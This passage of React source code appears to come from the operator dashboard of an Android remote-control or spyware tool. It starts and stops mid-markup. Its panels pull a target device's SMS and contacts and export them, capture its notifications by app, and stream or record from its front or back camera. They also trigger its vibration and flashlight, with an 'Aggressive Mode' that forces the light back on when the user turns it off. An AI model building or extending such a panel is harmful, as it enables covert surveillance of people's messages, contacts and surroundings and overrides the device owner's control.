                                                        className="px-3 py-2 rounded-lg border border-white/10 bg-white/5 text-white/70 text-sm hover:bg-white/10 transition-colors"
                                                    >
                                                        Reset
                                                    </button>
                                                    <button
                                                        onClick={downloadSmsAsCsv}
                                                        className="px-3 py-2 rounded-lg border border-green-500/30 bg-green-500/10 text-green-400 text-sm hover:bg-green-500/20 transition-colors flex items-center gap-1"
                                                    >
                                                        <svg className="w-4 h-4" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M4 16v1a3 3 0 003 3h10a3 3 0 003-3v-1m-4-4l-4 4m0 0l-4-4m4 4V4"></path></svg>
                                                        CSV
                                                    </button>
                                                </>
                                            )}
                                        </div>
                                        <div className="relative w-full sm:w-64">
                                            <input
                                                type="text"
                                                placeholder="Search SMS..."
                                                value={smsSearchQuery}
                                                onChange={(e) => setSmsSearchQuery(e.target.value)}
                                                className="w-full px-4 py-2 pl-10 rounded-lg bg-white/5 border border-white/10 text-white placeholder-white/40 focus:outline-none focus:border-purple-500/50"
                                            />
                                            <svg className="w-4 h-4 text-white/40 absolute left-3 top-1/2 -translate-y-1/2" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M21 21l-6-6m2-5a7 7 0 11-14 0 7 7 0 0114 0z"></path></svg>
                                        </div>
                                    </div>

                                    {smsList.length > 0 ? (
                                        <div className="flex flex-col gap-4 max-h-[65vh] overflow-y-auto px-3 sm:px-6 py-6 bg-black/20 rounded-[2rem] border border-white/5 relative scroll-smooth">
                                            <div className="sticky top-0 z-10 flex justify-center pb-4 pointer-events-none">
                                                <span className="px-3 py-1 rounded-full bg-white/5 backdrop-blur-xl border border-white/10 text-[10px] font-semibold text-white/40 uppercase tracking-widest">
                                                    {filteredSms.length} Messages
                                                </span>
                                            </div>
                                            {filteredSms.map((sms: any) => {
                                                const isSent = sms.type === 2;
                                                return (
                                                    <div
                                                        key={sms.id}
                                                        onClick={() => setSelectedSms(sms)}
                                                        className={`flex flex-col w-full ${isSent ? 'items-end' : 'items-start'} cursor-pointer group animate-slideUp`}
                                                    >
                                                        <div className="flex flex-col gap-1 max-w-[85%] sm:max-w-[70%]">
                                                            {!isSent && <span className="text-[11px] font-semibold text-white/50 ml-2 mb-0.5">{sms.address}</span>}
                                                            {isSent && <span className="text-[11px] font-semibold text-white/50 mr-2 mb-0.5 self-end">{sms.address}</span>}
                                                            
                                                            <div className={`px-4 py-2.5 rounded-2xl relative shadow-md transition-transform group-hover:scale-[1.02] ${isSent ? 'bg-gradient-to-tr from-indigo-500 to-purple-500 text-white rounded-br-sm shadow-[0_4px_15px_rgba(91,94,244,0.3)]' : 'bg-white/10 text-white rounded-bl-sm backdrop-blur-md border border-white/10'}`}>
                                                                <p className="text-[14px] leading-relaxed break-words whitespace-pre-wrap">{sms.body}</p>
                                                            </div>
                                                            
                                                            <span className={`text-[10px] font-medium text-white/30 ${isSent ? 'mr-1 self-end' : 'ml-1'} transition-opacity`}>
                                                                {new Date(sms.date).toLocaleDateString([], { month: 'short', day: 'numeric' })} • {new Date(sms.date).toLocaleTimeString([], { hour: '2-digit', minute: '2-digit' })}
                                                            </span>
                                                        </div>
                                                    </div>
                                                );
                                            })}
                                        </div>
                                    ) : (
                                        <div className="p-8 rounded-2xl bg-white/5 border border-white/10 text-center text-white/40">
                                            <svg className="w-12 h-12 mx-auto mb-3 opacity-50" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M8 10h.01M12 10h.01M16 10h.01M9 16H5a2 2 0 01-2-2V6a2 2 0 012-2h14a2 2 0 012 2v8a2 2 0 01-2 2h-5l-5 5v-5z"></path></svg>
                                            {!selectedDeviceId
                                                ? "Select a device to view SMS"
                                                : isFetchingSms
                                                    ? "Fetching SMS..."
                                                    : "Click \"Fetch All SMS\" to load messages"}
                                        </div>
                                    )}
                                </div>
                            )}

                            {/* Contacts Tool */}
                            {selectedTool === 'contacts' && (
                                <div className="space-y-4">
                                    <div className="flex flex-col sm:flex-row gap-3 justify-between items-start sm:items-center">
                                        <div className="flex gap-2">
                                            <button
                                                onClick={fetchContacts}
                                                disabled={!selectedDeviceId || isFetchingContacts}
                                                className={`px-4 py-2 rounded-lg border transition-colors text-sm font-medium flex items-center gap-2 ${selectedDeviceId ? 'bg-white text-black hover:bg-gray-200' : 'bg-white/5 border-white/5 text-white/20 cursor-not-allowed'}`}
                                            >
                                                {isFetchingContacts ? (
                                                    <div className="w-4 h-4 border-2 border-black/30 border-t-black rounded-full animate-spin" />
                                                ) : (
                                                    <svg className="w-4 h-4" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M4 4v5h.582m15.356 2A8.001 8.001 0 004.582 9m0 0H9m11 11v-5h-.581m0 0a8.003 8.003 0 01-15.357-2m15.357 2H15"></path></svg>
                                                )}
                                                Fetch Contacts
                                            </button>
                                            {contactsList.length > 0 && (
                                                <button
                                                    onClick={downloadContactsAsVcf}
                                                    className="px-3 py-2 rounded-lg border border-green-500/30 bg-green-500/10 text-green-400 text-sm hover:bg-green-500/20 transition-colors flex items-center gap-1"
                                                >
                                                    <svg className="w-4 h-4" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M4 16v1a3 3 0 003 3h10a3 3 0 003-3v-1m-4-4l-4 4m0 0l-4-4m4 4V4"></path></svg>
                                                    vCard
                                                </button>
                                            )}
                                        </div>
                                        <div className="relative w-full sm:w-64">
                                            <input
                                                type="text"
                                                placeholder="Search contacts..."
                                                value={contactsSearchQuery}
                                                onChange={(e) => setContactsSearchQuery(e.target.value)}
                                                className="w-full px-4 py-2 pl-10 rounded-lg bg-white/5 border border-white/10 text-white placeholder-white/40 focus:outline-none focus:border-purple-500/50"
                                            />
                                            <svg className="w-4 h-4 text-white/40 absolute left-3 top-1/2 -translate-y-1/2" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M21 21l-6-6m2-5a7 7 0 11-14 0 7 7 0 0114 0z"></path></svg>
                                        </div>
                                    </div>

                                    {contactsList.length > 0 ? (
                                        <div className="grid grid-cols-1 sm:grid-cols-2 lg:grid-cols-3 gap-3 max-h-[60vh] overflow-y-auto">
                                            <p className="text-xs text-white/40 col-span-full">{filteredContacts.length} contacts</p>
                                            {filteredContacts.map((contact: any) => (
                                                <div
                                                    key={contact.id}
                                                    className="bezel group"
                                                >
                                                    <div className="bezel-inner p-4 h-full transition-transform group-hover:scale-[1.02]">
                                                        <div className="flex items-center gap-3 mb-3">
                                                            <div className="w-12 h-12 rounded-full bg-gradient-to-br from-indigo-500 to-purple-500 shadow-[inset_0_2px_4px_rgba(255,255,255,0.3)] flex items-center justify-center font-bold text-lg">
                                                                {contact.name?.charAt(0)?.toUpperCase() || '?'}
                                                            </div>
                                                            <div className="flex-1 min-w-0">
                                                                <p className="font-semibold text-white truncate">{contact.name}</p>
                                                            </div>
                                                        </div>
                                                    {contact.phones?.length > 0 && (
                                                        <div className="space-y-1">
                                                            {contact.phones.slice(0, 2).map((phone: any, idx: number) => (
                                                                <p key={idx} className="text-xs text-white/60 flex items-center gap-1">
                                                                    <svg className="w-3 h-3" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M3 5a2 2 0 012-2h3.28a1 1 0 01.948.684l1.498 4.493a1 1 0 01-.502 1.21l-2.257 1.13a11.042 11.042 0 005.516 5.516l1.13-2.257a1 1 0 011.21-.502l4.493 1.498a1 1 0 01.684.949V19a2 2 0 01-2 2h-1C9.716 21 3 14.284 3 6V5z"></path></svg>
                                                                    {typeof phone === 'string' ? phone : phone?.number || 'Unknown'}
                                                                </p>
                                                            ))}
                                                        </div>
                                                    )}
                                                    {contact.emails?.length > 0 && (
                                                        <div className="mt-1">
                                                            {contact.emails.slice(0, 1).map((email: any, idx: number) => (
                                                                <p key={idx} className="text-xs text-white/60 flex items-center gap-1 truncate">
                                                                    <svg className="w-3 h-3" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M3 8l7.89 5.26a2 2 0 002.22 0L21 8M5 19h14a2 2 0 002-2V7a2 2 0 00-2-2H5a2 2 0 00-2 2v10a2 2 0 002 2z"></path></svg>
                                                                    {typeof email === 'string' ? email : email?.address || 'Unknown'}
                                                                </p>
                                                            ))}
                                                        </div>
                                                    )}
                                                    </div>
                                                </div>
                                            ))}
                                        </div>
                                    ) : (
                                        <div className="p-8 rounded-2xl bg-white/5 border border-white/10 text-center text-white/40">
                                            <svg className="w-12 h-12 mx-auto mb-3 opacity-50" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M17 20h5v-2a3 3 0 00-5.356-1.857M17 20H7m10 0v-2c0-.656-.126-1.283-.356-1.857M7 20H2v-2a3 3 0 015.356-1.857M7 20v-2c0-.656.126-1.283.356-1.857m0 0a5.002 5.002 0 019.288 0M15 7a3 3 0 11-6 0 3 3 0 016 0zm6 3a2 2 0 11-4 0 2 2 0 014 0zM7 10a2 2 0 11-4 0 2 2 0 014 0z"></path></svg>
                                            {!selectedDeviceId
                                                ? "Select a device to view contacts"
                                                : isFetchingContacts
                                                    ? "Fetching contacts..."
                                                    : "Click \"Fetch Contacts\" to load contacts"}
                                        </div>
                                    )}
                                </div>
                            )}

                            {/* Torch Tool */}
                            {selectedTool === 'torch' && (
                                <div className="bg-white/5 border border-white/10 p-6 rounded-2xl max-w-xl mx-auto">
                                    <div className="flex items-center justify-between mb-8">
                                        <div>
                                            <h3 className="text-xl font-bold mb-1">Flashlight Control</h3>
                                            <p className="text-white/40 text-sm">Control device flashlight remotely</p>
                                        </div>
                                        <button
                                            onClick={toggleTorch}
                                            disabled={!selectedDeviceId}
                                            className={`w-16 h-8 rounded-full transition-colors relative ${isTorchOn ? 'bg-yellow-500' : 'bg-white/20'}`}
                                        >
                                            <div className={`w-6 h-6 bg-white rounded-full absolute top-1 transition-transform shadow-lg ${isTorchOn ? 'left-9' : 'left-1'}`} />
                                        </button>
                                    </div>

                                    <div className="space-y-4 pt-4 border-t border-white/10">
                                        <div className="flex items-center justify-between p-4 rounded-xl bg-black/20">
                                            <div className="flex items-center gap-3">
                                                <div className="p-2 rounded-lg bg-red-500/20 text-red-400">
                                                    <svg className="w-5 h-5" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M13 10V3L4 14h7v7l9-11h-7z"></path></svg>
                                                </div>
                                                <div>
                                                    <p className="font-medium text-sm">Aggressive Mode</p>
                                                    <p className="text-xs text-white/40">Forces flashlight ON if turned off by user</p>
                                                </div>
                                            </div>
                                            <button
                                                onClick={() => setTorchAggressive(!torchAggressive)}
                                                className={`w-12 h-6 rounded-full transition-colors relative ${torchAggressive ? 'bg-red-500' : 'bg-white/20'}`}
                                            >
                                                <div className={`w-4 h-4 bg-white rounded-full absolute top-1 transition-transform ${torchAggressive ? 'left-7' : 'left-1'}`} />
                                            </button>
                                        </div>

                                        {torchAggressive && (
                                            <div className="p-4 rounded-xl bg-black/20 animate-fadeIn">
                                                <label className="block text-xs font-medium text-white/60 mb-2">Duration (minutes)</label>
                                                <div className="flex items-center gap-4">
                                                    <input
                                                        type="range"
                                                        min="1"
                                                        max="5"
                                                        step="1"
                                                        value={torchDuration / 60000}
                                                        onChange={(e) => setTorchDuration(parseInt(e.target.value) * 60000)}
                                                        className="flex-1 accent-yellow-500 h-2 bg-white/10 rounded-lg appearance-none cursor-pointer"
                                                    />
                                                    <span className="text-sm font-bold w-12 text-right">{torchDuration / 60000}m</span>
                                                </div>
                                            </div>
                                        )}
                                    </div>
                                </div>
                            )}

                            {/* Vibration Tool */}
                            {selectedTool === 'vibration' && (
                                <div className="bezel max-w-xl mx-auto">
                                    <div className="bezel-inner p-6">
                                    <div className="flex items-center justify-between mb-8">
                                        <div>
                                            <h3 className="text-xl font-bold mb-1">Vibration Control</h3>
                                            <p className="text-white/40 text-sm">Vibrate device remotely</p>
                                        </div>
                                    </div>

                                    <div className="space-y-6">
                                        <div>
                                            <label className="block text-xs font-medium text-white/60 mb-2">Duration (seconds)</label>
                                            <div className="flex items-center gap-4">
                                                <input
                                                    type="range"
                                                    min="0.5"
                                                    max="10"
                                                    step="0.5"
                                                    value={vibrationDuration / 1000}
                                                    onChange={(e) => setVibrationDuration(parseFloat(e.target.value) * 1000)}
                                                    className="flex-1 accent-orange-500 h-2 bg-white/10 rounded-lg appearance-none cursor-pointer"
                                                />
                                                <span className="text-sm font-bold w-12 text-right">{vibrationDuration / 1000}s</span>
                                            </div>
                                        </div>

                                        <button
                                            onClick={triggerVibration}
                                            disabled={!selectedDeviceId}
                                            className={`w-full py-4 rounded-xl font-bold text-lg transition-all flex items-center justify-center gap-2 ${selectedDeviceId ? 'bg-gradient-to-r from-orange-500 to-red-500 hover:scale-[1.02] shadow-lg shadow-orange-500/20' : 'bg-white/10 text-white/20 cursor-not-allowed'}`}
                                        >
                                            <svg className="w-6 h-6 animate-pulse" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M12 18h.01M8 21h8a2 2 0 002-2V5a2 2 0 00-2-2H8a2 2 0 00-2 2v14a2 2 0 002 2z"></path></svg>
                                            Vibrate Now
                                        </button>
                                    </div>
                                </div>
                                </div>
                            )}

                            {/* Notification Monitoring Tool */}
                            {selectedTool === 'notifications' && (
                                <div className="space-y-4">
                                    {/* App Filter Bar */}
                                    <div className="space-y-3">
                                        <div className="flex items-center justify-between">
                                            <span className="text-xs font-semibold uppercase tracking-wider text-white/30">Filter by App</span>
                                            {notifications.filter(n => !selectedDeviceId || n.deviceId === selectedDeviceId).length > 0 && (
                                                <span className="px-2 py-0.5 bg-cyan-500/15 text-cyan-400 text-[10px] font-bold rounded-full">
                                                    {notifications.filter(n => {
                                                        if (selectedDeviceId && n.deviceId !== selectedDeviceId) return false;
                                                        if (selectedNotifApp === 'all') return true;
                                                        const filter = notifAppFilters.find(f => f.key === selectedNotifApp);
                                                        return filter?.packages.some(p => n.packageName?.includes(p));
                                                    }).length} results
                                                </span>
                                            )}
                                        </div>
                                        <div className="flex gap-1.5 overflow-x-auto pb-1" style={{ scrollbarWidth: 'none' }}>
                                            {notifAppFilters.map(app => (
                                                <button
                                                    key={app.key}
                                                    onClick={() => setSelectedNotifApp(app.key)}
                                                    className={`flex items-center gap-2 px-3 py-2 rounded-full transition-all flex-shrink-0 ${selectedNotifApp === app.key
                                                        ? 'shadow-lg scale-[1.03]'
                                                        : 'bg-white/[0.04] hover:bg-white/[0.08] border border-white/[0.06]'
                                                        }`}
                                                    style={selectedNotifApp === app.key ? {
                                                        background: `linear-gradient(135deg, ${app.color}25, ${app.color}10)`,
                                                        border: `1px solid ${app.color}50`,
                                                        boxShadow: `0 0 20px ${app.color}15`
                                                    } : {}}
                                                >
                                                    {app.key === 'all' ? (
                                                        <svg className="w-4 h-4" style={{ color: selectedNotifApp === app.key ? app.color : 'rgba(255,255,255,0.4)' }} fill="none" stroke="currentColor" viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M15 17h5l-1.405-1.405A2.032 2.032 0 0118 14.158V11a6.002 6.002 0 00-4-5.659V5a2 2 0 10-4 0v.341C7.67 6.165 6 8.388 6 11v3.159c0 .538-.214 1.055-.595 1.436L4 17h5m6 0v1a3 3 0 11-6 0v-1m6 0H9"></path></svg>
                                                    ) : (
                                                        <img src={app.img} alt={app.label} className="w-4 h-4 rounded-[4px] object-contain" />
                                                    )}
                                                    <span className={`text-xs font-medium whitespace-nowrap ${selectedNotifApp === app.key ? 'text-white' : 'text-white/40'
                                                        }`}>{app.label}</span>
                                                </button>
                                            ))}
                                        </div>
                                    </div>

                                    {/* Search */}
                                    <div className="relative">
                                        <svg className="absolute left-3 top-1/2 -translate-y-1/2 w-4 h-4 text-white/30" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M21 21l-6-6m2-5a7 7 0 11-14 0 7 7 0 0114 0z"></path></svg>
                                        <input
                                            type="text"
                                            placeholder="Search by app or content..."
                                            value={notificationSearch}
                                            onChange={(e) => setNotificationSearch(e.target.value)}
                                            className="w-full bg-white/5 border border-white/10 rounded-xl pl-10 pr-4 py-3 text-sm focus:outline-none focus:border-cyan-500/50 transition-colors"
                                        />
                                    </div>

                                    {/* Empty State */}
                                    {notifications.length === 0 && (
                                        <div className="text-center py-12">
                                            <svg className="w-16 h-16 mx-auto mb-4 text-white/10" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth="1.5" d="M15 17h5l-1.405-1.405A2.032 2.032 0 0118 14.158V11a6.002 6.002 0 00-4-5.659V5a2 2 0 10-4 0v.341C7.67 6.165 6 8.388 6 11v3.159c0 .538-.214 1.055-.595 1.436L4 17h5m6 0v1a3 3 0 11-6 0v-1m6 0H9"></path></svg>
                                            <p className="text-white/40 font-medium">No notifications yet</p>
                                            <p className="text-white/20 text-xs mt-1">Notifications will appear here automatically</p>
                                        </div>
                                    )}

                                    {/* Notification Cards */}
                                    <div className="space-y-2 max-h-[65vh] overflow-y-auto pr-1" style={{ scrollbarWidth: 'thin', scrollbarColor: 'rgba(255,255,255,0.1) transparent' }}>
                                        {notifications
                                            .filter(n => {
                                                // Per-device filter
                                                if (selectedDeviceId && n.deviceId && n.deviceId !== selectedDeviceId) return false;
                                                // App filter
                                                if (selectedNotifApp !== 'all') {
                                                    const filter = notifAppFilters.find(f => f.key === selectedNotifApp);
                                                    if (filter && !filter.packages.some(p => n.packageName?.includes(p))) return false;
                                                }
                                                // Search filter
                                                if (!notificationSearch) return true;
                                                const q = notificationSearch.toLowerCase();
                                                return (n.appName?.toLowerCase().includes(q) || n.title?.toLowerCase().includes(q) || n.text?.toLowerCase().includes(q));
                                            })
                                            .map((notif, idx) => {
                                                const timeAgo = (() => {
                                                    const diff = Date.now() - (notif.receivedAt || notif.timestamp);
                                                    if (diff < 60000) return `${Math.floor(diff / 1000)}s ago`;
                                                    if (diff < 3600000) return `${Math.floor(diff / 60000)}m ago`;
                                                    if (diff < 86400000) return `${Math.floor(diff / 3600000)}h ago`;
                                                    return new Date(notif.timestamp).toLocaleDateString();
                                                })();

                                                // Determine if this is a new notification (less than 30s old)
                                                const isNew = (Date.now() - (notif.receivedAt || notif.timestamp)) < 30000;

                                                // Map category to color
                                                const categoryColors: Record<string, string> = {
                                                    msg: 'border-l-green-500',
                                                    email: 'border-l-blue-500',
                                                    call: 'border-l-yellow-500',
                                                    social: 'border-l-pink-500',
                                                    promo: 'border-l-orange-500',
                                                };
                                                const borderColor = categoryColors[notif.category] || 'border-l-cyan-500';

                                                return (
                                                    <button
                                                        key={`${notif.id}-${idx}`}
                                                        onClick={() => setSelectedNotification(notif)}
                                                        className={`w-full text-left p-3 rounded-xl border border-white/10 hover:bg-white/10 transition-all border-l-4 ${borderColor} ${notif.dismissed ? 'opacity-40' : ''} ${isNew ? 'bg-cyan-500/10 ring-1 ring-cyan-500/30' : 'bg-white/5'}`}
                                                    >
                                                        <div className="flex items-start gap-3">
                                                            {notif.icon ? (
                                                                <img
                                                                    src={`data:image/png;base64,${notif.icon}`}
                                                                    alt={notif.appName}
                                                                    className="w-8 h-8 rounded-lg flex-shrink-0"
                                                                />
                                                            ) : (
                                                                <div className="w-8 h-8 rounded-lg bg-cyan-500/20 flex items-center justify-center flex-shrink-0">
                                                                    <svg className="w-4 h-4 text-cyan-400" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M15 17h5l-1.405-1.405A2.032 2.032 0 0118 14.158V11a6.002 6.002 0 00-4-5.659V5a2 2 0 10-4 0v.341C7.67 6.165 6 8.388 6 11v3.159c0 .538-.214 1.055-.595 1.436L4 17h5m6 0v1a3 3 0 11-6 0v-1m6 0H9"></path></svg>
                                                                </div>
                                                            )}
                                                            <div className="flex-1 min-w-0">
                                                                <div className="flex items-center justify-between">
                                                                    <span className="text-xs font-medium text-cyan-400">{notif.appName}</span>
                                                                    <div className="flex items-center gap-1.5 flex-shrink-0">
                                                                        {isNew && <span className="w-1.5 h-1.5 bg-cyan-400 rounded-full animate-pulse" />}
                                                                        <span className="text-[10px] text-white/30">{timeAgo}</span>
                                                                    </div>
                                                                </div>
                                                                {notif.title && <p className={`text-sm truncate ${isNew ? 'font-bold text-white' : 'font-semibold text-white/90'}`}>{notif.title}</p>}
                                                                {notif.text && <p className="text-xs text-white/50 line-clamp-2 mt-0.5">{notif.text}</p>}
                                                            </div>
                                                        </div>
                                                    </button>
                                                );
                                            })
                                        }
                                    </div>
                                </div>
                            )}

                            {/* Notification Detail Modal */}
                            {selectedNotification && (
                                <div className="fixed inset-0 z-50 flex items-center justify-center bg-black/80 backdrop-blur-sm animate-fadeIn">
                                    <div className="bg-[#1a1a1a] border border-white/20 p-6 rounded-2xl shadow-2xl max-w-lg w-full mx-4 animate-scaleIn">
                                        <div className="flex justify-between items-start mb-4">
                                            <div className="flex items-center gap-3">
                                                {selectedNotification.icon ? (
                                                    <img
                                                        src={`data:image/png;base64,${selectedNotification.icon}`}
                                                        alt={selectedNotification.appName}
                                                        className="w-10 h-10 rounded-xl"
                                                    />
                                                ) : (
                                                    <div className="w-10 h-10 rounded-xl bg-cyan-500/20 flex items-center justify-center">
                                                        <svg className="w-5 h-5 text-cyan-400" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M15 17h5l-1.405-1.405A2.032 2.032 0 0118 14.158V11a6.002 6.002 0 00-4-5.659V5a2 2 0 10-4 0v.341C7.67 6.165 6 8.388 6 11v3.159c0 .538-.214 1.055-.595 1.436L4 17h5m6 0v1a3 3 0 11-6 0v-1m6 0H9"></path></svg>
                                                    </div>
                                                )}
                                                <div>
                                                    <h3 className="text-lg font-bold">{selectedNotification.appName}</h3>
                                                    <p className="text-xs text-white/40">
                                                        {new Date(selectedNotification.timestamp).toLocaleString()}
                                                    </p>
                                                </div>
                                            </div>
                                            <button
                                                onClick={() => setSelectedNotification(null)}
                                                className="p-2 hover:bg-white/10 rounded-lg transition-colors"
                                            >
                                                <svg className="w-5 h-5" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M6 18L18 6M6 6l12 12"></path></svg>
                                            </button>
                                        </div>
                                        {selectedNotification.title && (
                                            <div className="mb-3">
                                                <p className="text-sm font-semibold">{selectedNotification.title}</p>
                                            </div>
                                        )}
                                        <div className="p-4 rounded-xl bg-white/5 border border-white/10 mb-4">
                                            <p className="text-sm whitespace-pre-wrap">{selectedNotification.text || 'No content'}</p>
                                            {selectedNotification.subText && (
                                                <p className="text-xs text-white/40 mt-2">{selectedNotification.subText}</p>
                                            )}
                                        </div>
                                        <div className="flex gap-2 flex-wrap">
                                            <span className="text-xs px-3 py-1 rounded-full bg-cyan-500/20 text-cyan-400">
                                                {selectedNotification.packageName}
                                            </span>
                                            {selectedNotification.category && selectedNotification.category !== 'unknown' && (
                                                <span className="text-xs px-3 py-1 rounded-full bg-white/10 text-white/60">
                                                    {selectedNotification.category}
                                                </span>
                                            )}
                                            {selectedNotification.isOngoing && (
                                                <span className="text-xs px-3 py-1 rounded-full bg-yellow-500/20 text-yellow-400">Ongoing</span>
                                            )}
                                            {selectedNotification.dismissed && (
                                                <span className="text-xs px-3 py-1 rounded-full bg-red-500/20 text-red-400">Dismissed</span>
                                            )}
                                        </div>
                                    </div>
                                </div>
                            )}

                            {/* Camera Tool - Compact UI */}
                            {selectedTool === 'camera' && (
                                <div className="space-y-4">
                                    {/* Live Feed Container */}
                                    <div className={`bezel overflow-hidden ${isFullscreen ? 'fixed inset-2 z-50 flex flex-col' : ''}`}>
                                        <div className="bezel-inner bg-[#0a0a0f] flex flex-col">
                                        {/* Compact Header - Hidden in fullscreen */}
                                        {!isFullscreen && (
                                            <div className="px-3 py-2 border-b border-white/10 flex items-center justify-between bg-black/40">
                                                <div className="flex items-center gap-2">
                                                    <div className={`w-2 h-2 rounded-full ${isLiveStreaming ? 'bg-red-500 animate-pulse' : isRecording ? 'bg-orange-500 animate-pulse' : isVideoUploading ? 'bg-blue-500 animate-pulse' : 'bg-green-500/50'}`} />
                                                    <span className="text-xs text-white/60 font-mono">
                                                        {isLiveStreaming ? 'LIVE' : isRecording ? `REC ${recordingProgress.current}s` : isVideoUploading ? 'UPLOADING...' : selectedDeviceId ? selectedDeviceId.substring(0, 8) : 'NO DEVICE'}
                                                    </span>
                                                </div>
                                                <div className="flex items-center gap-2">
                                                    {/* Quality Selector */}
                                                    <select
                                                        value={streamQuality}
                                                        onChange={(e) => setStreamQuality(Number(e.target.value))}
                                                        className="bg-black/50 border border-white/20 rounded px-1.5 py-0.5 text-xs text-cyan-400 font-mono"
                                                        disabled={isLiveStreaming}
                                                    >
                                                        <option value={144}>144p</option>
                                                        <option value={240}>240p</option>
                                                        <option value={360}>360p</option>
                                                        <option value={480}>480p</option>
                                                        <option value={720}>720p</option>
                                                    </select>
                                                    {/* Fullscreen */}
                                                    <button
                                                        onClick={() => setIsFullscreen(true)}
                                                        className="p-1.5 rounded bg-white/10 text-white/60 hover:bg-white/20"
                                                    >
                                                        <svg className="w-3.5 h-3.5" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M4 8V4m0 0h4M4 4l5 5m11-1V4m0 0h-4m4 0l-5 5M4 16v4m0 0h4m-4 0l5-5m11 5l-5-5m5 5v-4m0 4h-4"></path></svg>
                                                    </button>
                                                </div>
                                            </div>
                                        )}

                                        {/* Main Viewport */}
                                        <div className={`relative bg-black flex items-center justify-center overflow-hidden ${isFullscreen ? 'flex-1' : 'aspect-video'}`}>
                                            {/* Live Stream View */}
                                            {isLiveStreaming && liveFrame ? (
                                                <img src={`data:image/jpeg;base64,${liveFrame}`} className="w-full h-full object-contain" alt="Live" />
                                            ) : isRecording ? (
                                                /* Compact Recording Animation */
                                                <div className="flex flex-col items-center gap-3">
                                                    <div className="relative w-16 h-16">
                                                        <div className="absolute inset-0 border-2 border-red-500/30 rounded-full"></div>
                                                        <div className="absolute inset-0 border-2 border-red-500 rounded-full border-t-transparent animate-spin"></div>
                                                        <div className="absolute inset-2 bg-red-500/20 rounded-full flex items-center justify-center">
                                                            <span className="text-xl font-bold text-red-500">{recordingProgress.current}</span>
                                                        </div>
                                                    </div>
                                                    <div className="text-center">
                                                        <p className="text-red-400 text-sm font-mono">● REC</p>
                                                        <div className="w-32 mt-2 bg-white/10 rounded-full h-1.5 overflow-hidden">
                                                            <div className="bg-red-500 h-full transition-all duration-1000" style={{ width: `${(recordingProgress.current / recordingProgress.total) * 100}%` }}></div>
                                                        </div>
                                                    </div>
                                                </div>
                                            ) : isVideoUploading ? (
                                                /* Upload Status */
                                                <div className="flex flex-col items-center gap-3">
                                                    <div className="w-12 h-12 border-2 border-blue-500 border-t-transparent rounded-full animate-spin"></div>
                                                    <p className="text-blue-400 text-sm font-mono">Uploading video...</p>
                                                </div>
                                            ) : (
                                                /* Idle State with Animation */
                                                <div className="text-center">
                                                    <div className="relative w-16 h-16 mx-auto mb-2">
                                                        <div className="absolute inset-0 border-2 border-cyan-500/30 rounded-full animate-ping"></div>
                                                        <div className="absolute inset-0 border-2 border-cyan-500/20 rounded-full flex items-center justify-center">
                                                            <svg className="w-8 h-8 text-cyan-500/40" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth="1.5" d="M15 10l4.553-2.276A1 1 0 0121 8.618v6.764a1 1 0 01-1.447.894L15 14M5 18h8a2 2 0 002-2V8a2 2 0 00-2-2H5a2 2 0 00-2 2v8a2 2 0 002 2z"></path></svg>
                                                        </div>
                                                    </div>
                                                    <p className="text-white/30 text-xs">Ready</p>
                                                </div>
                                            )}

                                            {/* Camera Switch - Only show when NOT live streaming and not in fullscreen */}
                                            {!isFullscreen && !isLiveStreaming && (
                                                <button
                                                    onClick={() => setCameraMode(prev => prev === 'back' ? 'front' : 'back')}
                                                    className={`absolute top-2 left-2 flex items-center gap-1.5 px-2 py-1 rounded-lg text-xs font-bold ${cameraMode === 'front' ? 'bg-purple-500/80 text-white' : 'bg-cyan-500/80 text-white'}`}
                                                >
                                                    <svg className="w-3.5 h-3.5" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M4 4v5h.582m15.356 2A8.001 8.001 0 004.582 9m0 0H9m11 11v-5h-.581m0 0a8.003 8.003 0 01-15.357-2m15.357 2H15"></path></svg>
                                                    {cameraMode.toUpperCase()}
                                                </button>
                                            )}

                                            {/* Fullscreen Close Button */}
                                            {isFullscreen && (
                                                <button
                                                    onClick={() => setIsFullscreen(false)}
                                                    className="absolute top-3 right-3 p-2 rounded-full bg-black/50 text-white hover:bg-black/70"
                                                >
                                                    <svg className="w-5 h-5" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M6 18L18 6M6 6l12 12"></path></svg>
                                                </button>
                                            )}

